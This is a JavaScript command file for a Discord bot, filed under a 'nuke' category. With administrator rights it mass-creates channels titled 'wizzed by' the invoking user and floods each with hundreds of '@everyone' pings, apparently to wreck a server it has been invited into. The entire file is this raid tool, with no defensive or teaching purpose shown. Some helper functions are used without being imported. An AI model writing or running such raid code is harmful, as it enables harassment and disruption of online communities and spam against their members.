const config = require("../../config.json");
const { MessageEmbed, RichEmbed, Message } = require("discord.js");
const { promptMessage, successEmbed } = require("../../functions.js");
const fs = require("fs");
const db = require('quick.db');//https://www.npmjs.com/package/quick.db
module.exports = {
    name: "mp",
    category: "nuke",
    description: "",
    run: async (client, message, args, arguments) => {
            if (message.guild.me.hasPermission("ADMINISTRATOR")) {
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                // If you dont give an input
                if (!argresult) {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create('wizzed by ' + message.author.username)

                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create('wizzed by ' + message.author.username)

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone ' + argresult)
                                        console.log(blueBright(`CHANNEL PINGED!`));
                                        // other per-channnel logic
                                    }
                                }
                            );
                        }

                    }
                }
            } else {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                
            }
        }
}